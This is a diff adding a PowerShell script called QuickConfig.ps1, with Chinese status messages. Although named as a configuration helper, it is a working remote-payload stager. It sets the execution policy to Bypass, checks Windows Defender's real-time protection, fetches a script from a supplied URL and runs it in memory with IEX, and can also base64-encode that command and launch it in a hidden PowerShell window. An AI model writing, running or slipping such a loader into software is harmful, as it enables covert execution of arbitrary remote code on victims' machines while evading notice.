@@ -1,0 +1,36 @@
+# QuickConfig.ps1
+   param(
+       [string]$Action = "help",
+       [string]$Url = ""
+   )
+
+   function Set-ExecutionPolicyBypass {
+       Write-Host "[+] 设置执行策略为 Bypass..."
+       powershell.exe -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Bypass -Scope Process -Force"
+   }
+
+   function Check-DefenderStatus {
+       Write-Host "[+] 检查 Defender 状态..."
+       Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled
+   }
+
+   function Download-Execute {
+       if (-not $Url) { Write-Host "[-] 需要提供 -Url 参数"; return }
+       Write-Host "[+] 下载并执行远程脚本..."
+       IEX (New-Object Net.WebClient).DownloadString($Url)
+   }
+
+   function Hide-Execute {
+       if (-not $Url) { Write-Host "[-] 需要提供 -Url 参数"; return }
+       Write-Host "[+] 隐藏执行远程脚本..."
+       $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString('$Url')"))
+       Start-Process powershell -ArgumentList "-WindowStyle Hidden -EncodedCommand $encoded" -NoNewWindow
+   }
+
+   switch ($Action) {
+       "bypass" { Set-ExecutionPolicyBypass }
+       "checkdefender" { Check-DefenderStatus }
+       "download" { Download-Execute }
+       "hide" { Hide-Execute }
+       default { Write-Host "用法: .\QuickConfig.ps1 -Action <bypass|checkdefender|download|hide> [-Url <脚本URL>]" }
+   }
